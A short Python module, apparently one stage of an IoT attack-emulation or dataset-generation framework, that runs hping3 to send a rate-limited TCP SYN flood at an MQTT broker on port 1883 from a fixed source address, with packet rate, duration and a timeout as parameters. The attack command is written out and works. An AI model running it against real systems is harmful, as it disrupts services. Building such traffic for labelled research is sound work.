"""syn_flood: rate-limited TCP SYN load at the broker's MQTT port from the fixed attacker
address. Bounded by an explicit inter-packet interval (~pps), a packet count, and a timeout.
Never --rand-source (labelling and incident grouping depend on a fixed source)."""
from .. import util


def syn_flood(ctx, params):
    pps = int(params.get("pps", 1000))
    duration = int(params.get("duration", 30))
    interval_us = max(1, 1_000_000 // pps)
    count = pps * duration
    rc, _, _ = util.run(
        ["hping3", "-S", "-p", "1883", "-i", f"u{interval_us}", "-c", str(count), ctx.broker_ip],
        timeout=duration + 5)
    return {"targets": [ctx.broker_ip],
            "notes": f"hping3 SYN ~{pps}pps for {duration}s (count={count}) rc={rc}"}


syn_flood.STAGE = "disruption"
